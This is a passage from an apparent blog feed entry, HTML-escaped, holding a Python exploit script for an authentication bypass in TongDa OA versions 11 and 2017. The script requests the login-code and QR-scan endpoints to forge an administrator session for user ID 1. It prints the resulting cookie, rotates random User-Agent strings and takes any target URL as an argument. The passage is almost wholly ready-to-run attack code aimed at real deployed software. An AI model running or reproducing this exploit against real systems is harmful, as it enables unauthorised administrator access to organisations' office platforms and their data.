Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">headers=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getV11Session</span>(<span class="params">url</span>):</span></span><br><span class="line">    checkUrl = url+<span class="string">&#x27;/general/login_code.php&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS)</span><br><span class="line">        res = requests.get(checkUrl,headers=headers)</span><br><span class="line">        resText = <span class="built_in">str</span>(res.text).split(<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">        codeUid = resText[-<span class="number">1</span>].replace(<span class="string">&#x27;&#125;&quot;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        getSessUrl = url+<span class="string">&#x27;/logincheck_code.php&#x27;</span></span><br><span class="line">        res = requests.post(</span><br><span class="line">            getSessUrl, data=&#123;<span class="string">&#x27;CODEUID&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>+codeUid+<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;UID&#x27;</span>: <span class="built_in">int</span>(<span class="number">1</span>)&#125;,headers=headers)</span><br><span class="line">        tmp_cookie = res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">&quot;Cookie&quot;</span>] = tmp_cookie</span><br><span class="line">        check_available = requests.get(url + <span class="string">&#x27;/general/index.php&#x27;</span>,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;用户未登录&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> check_available.text:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;重新登录&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> check_available.text:</span><br><span class="line">                print(<span class="string">&#x27;[+]Get Available COOKIE:&#x27;</span> + tmp_cookie)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span> + url + <span class="string">&#x27;,Maybe Not Vulnerable.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get2017Session</span>(<span class="params">url</span>):</span></span><br><span class="line">    checkUrl = url+<span class="string">&#x27;/ispirit/login_code.php&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS)</span><br><span class="line">        res = requests.get(checkUrl,headers=headers)</span><br><span class="line">        resText = json.loads(res.text)</span><br><span class="line">        codeUid = resText[<span class="string">&#x27;codeuid&#x27;</span>]</span><br><span class="line">        codeScanUrl = url+<span class="string">&#x27;/general/login_code_scan.php&#x27;</span></span><br><span class="line">        res = requests.post(codeScanUrl, data=&#123;<span class="string">&#x27;codeuid&#x27;</span>: codeUid, <span class="string">&#x27;uid&#x27;</span>: <span class="built_in">int</span>(</span><br><span class="line">            <span class="number">1</span>), <span class="string">&#x27;source&#x27;</span>: <span class="string">&#x27;pc&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;confirm&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;,headers=headers)</span><br><span class="line">        resText = json.loads(res.text)</span><br><span class="line">        status = resText[<span class="string">&#x27;status&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> status == <span class="built_in">str</span>(<span class="number">1</span>):</span><br><span class="line">            getCodeUidUrl = url+<span class="string">&#x27;/ispirit/login_code_check.php?codeuid=&#x27;</span>+codeUid</span><br><span class="line">            res = requests.get(getCodeUidUrl)</span><br><span class="line">            tmp_cookie = res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">            headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS)</span><br><span class="line">            headers[<span class="string">&quot;Cookie&quot;</span>] = tmp_cookie</span><br><span class="line">            check_available = requests.get(url + <span class="string">&#x27;/general/index.php&#x27;</span>,headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;用户未登录&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> check_available.text:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;重新登录&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> check_available.text:</span><br><span class="line">                    print(<span class="string">&#x27;[+]Get Available COOKIE:&#x27;</span> + tmp_cookie)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span> + url + <span class="string">&#x27;,Maybe Not Vulnerable.&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url  + <span class="string">&#x27; Maybe Not Vulnerable ?&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-v&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--tdoaversion&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="built_in">int</span>,</span><br><span class="line">        choices=[<span class="number">11</span>, <span class="number">2017</span>],</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Target TongDa OA Version. e.g: -v 11、-v 2017&quot;</span>)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-url&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--targeturl&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Target URL. e.g: -url 192.168.2.1、-url http://192.168.2.1&quot;</span></span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    url = args.targeturl</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">&#x27;http://&#x27;</span> + url</span><br><span class="line">    <span class="keyword">if</span> args.tdoaversion == <span class="number">11</span>:</span><br><span class="line">        getV11Session(url)</span><br><span class="line">    <span class="keyword">elif</span> args.tdoaversion == <span class="number">2017</span>:</span><br><span class="line">        get2017Session(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser.print_help()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-漏洞描述&quot;&gt;&lt;a href=&quot;#1-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞描述&quot;&gt;&lt;/a&gt;1. 漏洞描述&lt;/h2&gt;&lt;p&gt;通达OA系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。&lt;br&gt;Office </summary>
      
    
    
    
    
  </entry>
  
</feed>
